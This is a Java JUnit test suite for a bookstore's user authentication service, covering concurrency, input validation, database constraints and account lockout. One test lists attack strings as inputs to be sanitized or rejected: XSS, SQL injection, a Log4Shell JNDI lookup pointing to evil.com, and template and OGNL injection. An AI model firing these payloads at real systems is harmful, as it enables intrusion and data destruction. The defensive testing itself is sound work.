package com.bookstore.user_authentication_service.edge;

import com.bookstore.user_authentication_service.dto.UserRegistrationRequest;
import com.bookstore.user_authentication_service.dto.AddressDTO;
import com.bookstore.user_authentication_service.dto.UserDTO;
import com.bookstore.user_authentication_service.entity.*;
import com.bookstore.user_authentication_service.exception.ValidationException;
import com.bookstore.user_authentication_service.exception.ResourceNotFoundException;
import com.bookstore.user_authentication_service.repository.UserRepository;
import com.bookstore.user_authentication_service.repository.AddressRepository;
import com.bookstore.user_authentication_service.service.UserService;
import com.bookstore.user_authentication_service.service.AddressService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.RepeatedTest;
import org.junit.jupiter.api.Timeout;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.dao.DataIntegrityViolationException;
import org.springframework.test.context.TestPropertySource;
import org.springframework.transaction.annotation.Transactional;

import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Optional;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.*;

@SpringBootTest
@TestPropertySource(properties = "spring.profiles.active=test")
@Transactional
@DisplayName("Edge Cases and Error Scenarios Tests")
class EdgeCaseTest {

    @Autowired
    private UserService userService;

    @Autowired
    private AddressService addressService;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private AddressRepository addressRepository;

    private UserRegistrationRequest baseRegistrationRequest;
    private AddressDTO baseAddressDTO;

    @BeforeEach
    void setUp() {
        baseRegistrationRequest = UserRegistrationRequest.builder()
                .username("edgeuser")
                .email("edge@example.com")
                .password("Password123!")
                .confirmPassword("Password123!")
                .fullName("Edge Test User")
                .mobileNumber("9876543210")
                .build();

        baseAddressDTO = AddressDTO.builder()
                .name("Edge User")
                .phone("9876543210")
                .addressLine1("123 Edge St")
                .landmark("Edge Locality")
                .city("Edge City")
                .state("Edge State")
                .country("Edge Country")
                .pincode("123456")
                .addressType(AddressType.HOME)
                .build();
    }

    @Nested
    @DisplayName("Concurrent Operations Tests")
    class ConcurrentOperationsTests {

        @Test
        @Timeout(value = 10, unit = TimeUnit.SECONDS)
        @DisplayName("Should handle concurrent user creation with same username")
        void shouldHandleConcurrentUserCreationWithSameUsername() throws Exception {
            ExecutorService executor = Executors.newFixedThreadPool(5);
            List<CompletableFuture<Void>> futures = new ArrayList<>();

            // Attempt to create 5 users with the same username concurrently
            for (int i = 0; i < 5; i++) {
                CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                    UserRegistrationRequest request = UserRegistrationRequest.builder()
                            .username("concurrent_user")
                            .email("concurrent" + System.nanoTime() + "@example.com")
                            .password("Password123!")
                            .confirmPassword("Password123!")
                            .fullName("Concurrent User")
                            .build();

                    try {
                        userService.createUser(request);
                    } catch (ValidationException | DataIntegrityViolationException e) {
                        // Expected for duplicate usernames
                    }
                }, executor);
                futures.add(future);
            }

            // Wait for all to complete
            CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
            executor.shutdown();

            // Verify only one user was created
            List<User> users = userRepository.findAll().stream()
                    .filter(u -> "concurrent_user".equals(u.getUsername()))
                    .toList();
            assertEquals(1, users.size());
        }

        @Test
        @Timeout(value = 10, unit = TimeUnit.SECONDS)
        @DisplayName("Should handle concurrent session management")
        void shouldHandleConcurrentSessionManagement() throws Exception {
            // First create a user
            User user = User.builder()
                    .username("sessionuser")
                    .email("session@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .createdAt(LocalDateTime.now())
                    .build();
            user = userRepository.save(user);

            ExecutorService executor = Executors.newFixedThreadPool(3);
            List<CompletableFuture<Void>> futures = new ArrayList<>();
            final String userId = user.getId();

            // Simulate concurrent failed login attempts
            for (int i = 0; i < 3; i++) {
                CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                    try {
                        userService.incrementFailedLoginAttempts(userId);
                    } catch (Exception e) {
                        // May fail due to concurrent modification
                    }
                }, executor);
                futures.add(future);
            }

            CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
            executor.shutdown();

            // Verify final state is consistent
            User updatedUser = userRepository.findById(userId).orElse(null);
            assertNotNull(updatedUser);
            assertTrue(updatedUser.getFailedLoginAttempts() >= 1);
            assertTrue(updatedUser.getFailedLoginAttempts() <= 3);
        }

        @RepeatedTest(5)
        @DisplayName("Should handle race conditions in default address setting")
        void shouldHandleRaceConditionsInDefaultAddressSetting() throws Exception {
            // Create user
            User user = User.builder()
                    .username("raceuser" + System.nanoTime())
                    .email("race" + System.nanoTime() + "@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .createdAt(LocalDateTime.now())
                    .build();
            user = userRepository.save(user);
            
            // Store user ID in effectively final variable for lambda usage
            final String userId = user.getId();

            // Create multiple addresses
            List<String> addressIds = new ArrayList<>();
            for (int i = 0; i < 3; i++) {
                AddressDTO addressDTO = AddressDTO.builder()
                        .name("User " + i)
                        .phone("987654321" + i)
                        .addressLine1("Address " + i)
                        .city("City " + i)
                        .state("State")
                        .country("Country")
                        .pincode("12345" + i)
                        .addressType(AddressType.HOME)
                        .build();
                
                AddressDTO created = addressService.createAddress(userId, addressDTO);
                addressIds.add(created.getId());
            }

            ExecutorService executor = Executors.newFixedThreadPool(3);
            List<CompletableFuture<Void>> futures = new ArrayList<>();

            // Try to set different addresses as default concurrently
            for (String addressId : addressIds) {
                CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                    try {
                        addressService.setDefaultAddress(userId, addressId);
                    } catch (Exception e) {
                        // May fail due to concurrent modification
                    }
                }, executor);
                futures.add(future);
            }

            CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
            executor.shutdown();

            // Verify only one address is marked as default
            List<Address> addresses = addressRepository.findByUserId(userId);
            long defaultCount = addresses.stream().mapToLong(a -> a.getIsDefault() ? 1 : 0).sum();
            assertEquals(1, defaultCount);
        }
    }

    @Nested
    @DisplayName("Extreme Input Tests")
    class ExtremeInputTests {

        static Stream<String> extremeUsernameProvider() {
            return Stream.of(
                "a", // Too short
                "ab", // Still too short
                "a".repeat(256), // Too long
                "user@#$%^&*()", // Special characters
                "user with spaces",
                "用户名", // Unicode characters
                "пользователь", // Cyrillic
                "مستخدم", // Arabic
                "ユーザー" // Japanese
            );
        }

        @ParameterizedTest
        @MethodSource("extremeUsernameProvider")
        @DisplayName("Should handle extreme username inputs")
        void shouldHandleExtremeUsernameInputs(String extremeUsername) {
            baseRegistrationRequest.setUsername(extremeUsername);

            if (extremeUsername.length() < 3 || extremeUsername.length() > 50 || 
                extremeUsername.contains(" ") || extremeUsername.matches(".*[^a-zA-Z0-9_.-].*")) {
                assertThrows(ValidationException.class, () -> 
                    userService.createUser(baseRegistrationRequest));
            } else {
                // Should work for valid unicode usernames
                assertDoesNotThrow(() -> userService.createUser(baseRegistrationRequest));
            }
        }

        @ParameterizedTest
        @NullAndEmptySource
        @ValueSource(strings = {
            " ", // Whitespace only
            "\t", // Tab
            "\n", // Newline
            "   ", // Multiple spaces
            "\u0000", // Null character
            "\u200B", // Zero-width space
        })
        @DisplayName("Should handle null and empty string inputs")
        void shouldHandleNullAndEmptyStringInputs(String invalidInput) {
            baseRegistrationRequest.setUsername(invalidInput);
            baseRegistrationRequest.setEmail(invalidInput);
            baseRegistrationRequest.setFullName(invalidInput);

            assertThrows(ValidationException.class, () -> 
                userService.createUser(baseRegistrationRequest));
        }

        @Test
        @DisplayName("Should handle extremely long string inputs")
        void shouldHandleExtremelyLongStringInputs() {
            String veryLongString = "a".repeat(10000);
            
            baseRegistrationRequest.setFullName(veryLongString);
            assertThrows(ValidationException.class, () -> 
                userService.createUser(baseRegistrationRequest));

            baseRegistrationRequest.setFullName("Valid Name");
            baseRegistrationRequest.setBio(veryLongString);
            assertThrows(ValidationException.class, () -> 
                userService.createUser(baseRegistrationRequest));
        }

        @Test
        @DisplayName("Should handle malicious script inputs")
        void shouldHandleMaliciousScriptInputs() {
            String[] maliciousInputs = {
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "'; DROP TABLE users; --",
                "<img src=x onerror=alert('xss')>",
                "${jndi:ldap://evil.com/a}",
                "{{7*7}}",
                "#{7*7}",
                "%{#context['xwork.MethodAccessor.denyMethodExecution']=false}"
            };

            for (String maliciousInput : maliciousInputs) {
                baseRegistrationRequest.setFullName(maliciousInput);
                baseRegistrationRequest.setBio(maliciousInput);
                
                // Should either sanitize or reject
                try {
                    userService.createUser(baseRegistrationRequest);
                    // If it succeeds, verify the input was sanitized
                    User user = userRepository.findByUsername(baseRegistrationRequest.getUsername()).orElse(null);
                    if (user != null) {
                        assertFalse(user.getFullName().contains("<script>"));
                        assertFalse(user.getBio() != null && user.getBio().contains("<script>"));
                    }
                } catch (ValidationException e) {
                    // Rejection is also acceptable
                    assertTrue(e.getMessage().contains("Invalid") || 
                              e.getMessage().contains("not allowed"));
                }
                
                // Reset for next iteration
                baseRegistrationRequest.setUsername("edgeuser" + System.nanoTime());
                baseRegistrationRequest.setEmail("edge" + System.nanoTime() + "@example.com");
            }
        }

        @Test
        @DisplayName("Should handle invalid GPS coordinates")
        void shouldHandleInvalidGpsCoordinates() {
            // Create a user first
            User userToSave = User.builder()
                    .username("gpsuser")
                    .email("gps@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .createdAt(LocalDateTime.now())
                    .build();
            final User user = userRepository.save(userToSave);

            // Test invalid coordinates
            BigDecimal[] invalidLatitudes = {
                new BigDecimal("91.0"), // > 90
                new BigDecimal("-91.0"), // < -90
                new BigDecimal("999.999"),
                new BigDecimal("-999.999")
            };

            BigDecimal[] invalidLongitudes = {
                new BigDecimal("181.0"), // > 180
                new BigDecimal("-181.0"), // < -180
                new BigDecimal("999.999"),
                new BigDecimal("-999.999")
            };

            for (BigDecimal invalidLat : invalidLatitudes) {
                baseAddressDTO.setLatitude(invalidLat.doubleValue());
                baseAddressDTO.setLongitude(new BigDecimal("0.0").doubleValue()); // Valid longitude
                
                assertThrows(ValidationException.class, () -> 
                    addressService.createAddress(user.getId(), baseAddressDTO));
            }

            for (BigDecimal invalidLon : invalidLongitudes) {
                baseAddressDTO.setLatitude(new BigDecimal("0.0").doubleValue()); // Valid latitude
                baseAddressDTO.setLongitude(invalidLon.doubleValue());
                
                assertThrows(ValidationException.class, () -> 
                    addressService.createAddress(user.getId(), baseAddressDTO));
            }
        }
    }

    @Nested
    @DisplayName("Database Constraint Tests")
    class DatabaseConstraintTests {

        @Test
        @DisplayName("Should handle unique constraint violations gracefully")
        void shouldHandleUniqueConstraintViolationsGracefully() {
            // Create first user
            userService.createUser(baseRegistrationRequest);

            // Try to create second user with same username
            UserRegistrationRequest duplicateUsername = UserRegistrationRequest.builder()
                    .username(baseRegistrationRequest.getUsername()) // Same username
                    .email("different@example.com") // Different email
                    .password("Password123!")
                    .confirmPassword("Password123!")
                    .fullName("Different User")
                    .build();

            assertThrows(ValidationException.class, () -> 
                userService.createUser(duplicateUsername));

            // Try to create second user with same email
            UserRegistrationRequest duplicateEmail = UserRegistrationRequest.builder()
                    .username("differentuser") // Different username
                    .email(baseRegistrationRequest.getEmail()) // Same email
                    .password("Password123!")
                    .confirmPassword("Password123!")
                    .fullName("Different User")
                    .build();

            assertThrows(ValidationException.class, () -> 
                userService.createUser(duplicateEmail));
        }

        @Test
        @DisplayName("Should handle foreign key constraint violations")
        void shouldHandleForeignKeyConstraintViolations() {
            // Try to create address for non-existent user
            assertThrows(ResourceNotFoundException.class, () -> 
                addressService.createAddress("non-existent-user-id", baseAddressDTO));

            // Try to update address for non-existent user
            assertThrows(ResourceNotFoundException.class, () -> 
                addressService.updateAddress("non-existent-user-id", "non-existent-address-id", baseAddressDTO));
        }

        @Test
        @DisplayName("Should handle transaction rollbacks")
        void shouldHandleTransactionRollbacks() {
            // Create a user
            User user = User.builder()
                    .username("transactionuser")
                    .email("transaction@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .createdAt(LocalDateTime.now())
                    .build();
            user = userRepository.save(user);

            // Create an address
            AddressDTO addressDTO = addressService.createAddress(user.getId(), baseAddressDTO);

            // Verify both user and address exist
            assertTrue(userRepository.existsById(user.getId()));
            assertTrue(addressRepository.existsById(addressDTO.getId()));

            // Try an operation that should fail and rollback
            try {
                // This should fail due to validation
                AddressDTO invalidAddress = AddressDTO.builder()
                        .name(null) // Invalid - required field
                        .phone("invalid")
                        .build();
                addressService.createAddress(user.getId(), invalidAddress);
            } catch (ValidationException e) {
                // Expected
            }

            // Verify original data is still intact
            assertTrue(userRepository.existsById(user.getId()));
            assertTrue(addressRepository.existsById(addressDTO.getId()));
        }
    }

    @Nested
    @DisplayName("Memory and Performance Tests")
    class MemoryAndPerformanceTests {

        @Test
        @Timeout(value = 5, unit = TimeUnit.SECONDS)
        @DisplayName("Should handle large number of addresses per user")
        void shouldHandleLargeNumberOfAddressesPerUser() {
            // Create a user
            User user = User.builder()
                    .username("bulkuser")
                    .email("bulk@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .createdAt(LocalDateTime.now())
                    .build();
            user = userRepository.save(user);

            // Create many addresses (test memory usage)
            for (int i = 0; i < 100; i++) {
                AddressDTO addressDTO = AddressDTO.builder()
                        .name("User " + i)
                        .phone("987654321" + (i % 10))
                        .addressLine1("Address " + i)
                        .landmark("Locality " + i)
                        .city("City " + i)
                        .state("State")
                        .country("Country")
                        .pincode("12345" + (i % 10))
                        .addressType(i % 2 == 0 ? AddressType.HOME : AddressType.WORK)
                        .build();
                
                addressService.createAddress(user.getId(), addressDTO);
            }

            // Verify all addresses were created
            List<AddressDTO> addresses = addressService.getUserAddresses(user.getId());
            assertEquals(100, addresses.size());

            // Verify only one is marked as default (the first one)
            long defaultCount = addresses.stream().mapToLong(a -> a.getIsDefault() ? 1 : 0).sum();
            assertEquals(1, defaultCount);
        }

        @Test
        @Timeout(value = 3, unit = TimeUnit.SECONDS)
        @DisplayName("Should handle rapid successive operations")
        void shouldHandleRapidSuccessiveOperations() {
            // Create a user
            User user = User.builder()
                    .username("rapiduser")
                    .email("rapid@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .createdAt(LocalDateTime.now())
                    .build();
            user = userRepository.save(user);

            // Rapid operations
            for (int i = 0; i < 50; i++) {
                // Update user last login
                userService.updateLastLogin(user.getId(), "127.0.0.1");
                
                // Reset failed attempts
                userService.resetFailedLoginAttempts(user.getId());
                
                // Increment failed attempts
                userService.incrementFailedLoginAttempts(user.getId());
            }

            // Verify final state
            User finalUser = userRepository.findById(user.getId()).orElse(null);
            assertNotNull(finalUser);
            assertNotNull(finalUser.getLastLoginAt());
        }
    }

    @Nested
    @DisplayName("Boundary Value Tests")
    class BoundaryValueTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "abc", // Minimum length (3)
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", // Maximum length (50)
            "ab", // Below minimum (2)
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" // Above maximum (51)
        })
        @DisplayName("Should handle username length boundaries")
        void shouldHandleUsernameLengthBoundaries(String username) {
            baseRegistrationRequest.setUsername(username);

            if (username.length() < 3 || username.length() > 50) {
                assertThrows(ValidationException.class, () -> 
                    userService.createUser(baseRegistrationRequest));
            } else {
                assertDoesNotThrow(() -> userService.createUser(baseRegistrationRequest));
            }
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "12345", // Minimum pincode length
            "123456", // Standard pincode length
            "1234567", // Extended pincode length
            "1234", // Below minimum
            "12345678" // Above maximum
        })
        @DisplayName("Should handle pincode length boundaries")
        void shouldHandlePincodeLengthBoundaries(String pincode) {
            // Create user first
            User user = User.builder()
                    .username("pincodeuser" + System.nanoTime())
                    .email("pincode" + System.nanoTime() + "@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .createdAt(LocalDateTime.now())
                    .build();
            final User savedUser = userRepository.save(user);

            baseAddressDTO.setPincode(pincode);

            if (pincode.length() < 5 || pincode.length() > 7) {
                assertThrows(ValidationException.class, () -> 
                    addressService.createAddress(savedUser.getId(), baseAddressDTO));
            } else {
                assertDoesNotThrow(() -> addressService.createAddress(savedUser.getId(), baseAddressDTO));
            }
        }

        @Test
        @DisplayName("Should handle maximum failed login attempts boundary")
        void shouldHandleMaximumFailedLoginAttemptsBoundary() {
            // Create user
            User user = User.builder()
                    .username("failuser")
                    .email("fail@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .failedLoginAttempts(0)
                    .createdAt(LocalDateTime.now())
                    .build();
            user = userRepository.save(user);

            // Increment to just below limit (4 attempts)
            for (int i = 0; i < 4; i++) {
                userService.incrementFailedLoginAttempts(user.getId());
            }

            User updatedUser = userRepository.findById(user.getId()).orElse(null);
            assertNotNull(updatedUser);
            assertEquals(4, updatedUser.getFailedLoginAttempts());
            assertEquals(AccountStatus.ACTIVE, updatedUser.getAccountStatus());

            // One more should lock the account
            userService.incrementFailedLoginAttempts(user.getId());

            User lockedUser = userRepository.findById(user.getId()).orElse(null);
            assertNotNull(lockedUser);
            assertEquals(5, lockedUser.getFailedLoginAttempts());
            assertEquals(AccountStatus.LOCKED, lockedUser.getAccountStatus());
        }
    }

    @Nested
    @DisplayName("Error Recovery Tests")
    class ErrorRecoveryTests {

        @Test
        @DisplayName("Should recover from temporary database connection issues")
        void shouldRecoverFromTemporaryDatabaseConnectionIssues() {
            // This test would require mocking database connection failures
            // For now, we'll test that the service handles repository exceptions gracefully
            
            // Test that getUserById returns empty Optional for non-existent user
            Optional<UserDTO> result = userService.getUserById("definitely-non-existent-id");
            assertTrue(result.isEmpty(), "Should return empty Optional for non-existent user");
            
            // Verify that subsequent operations still work
            assertDoesNotThrow(() -> userService.createUser(baseRegistrationRequest));
        }

        @Test
        @DisplayName("Should handle partial data corruption gracefully")
        void shouldHandlePartialDataCorruptionGracefully() {
            // Create user with some fields
            User user = User.builder()
                    .username("corruptuser")
                    .email("corrupt@example.com")
                    .password("encoded-password")
                    .userRole(UserRole.CUSTOMER)
                    .accountStatus(AccountStatus.ACTIVE)
                    .createdAt(LocalDateTime.now())
                    .build();
            user = userRepository.save(user);
            final String userId = user.getId(); // Store ID for lambda usage

            // Simulate partial corruption by setting some fields to null
            user.setFullName(null);
            user.setMobileNumber(null);
            userRepository.save(user);

            // Service should still be able to handle this user
            assertDoesNotThrow(() -> {
                Optional<UserDTO> result = userService.getUserById(userId);
                assertTrue(result.isPresent(), "Should find user even with partial data corruption");
            });
            assertDoesNotThrow(() -> userService.updateLastLogin(userId, "127.0.0.1"));
        }
    }
}
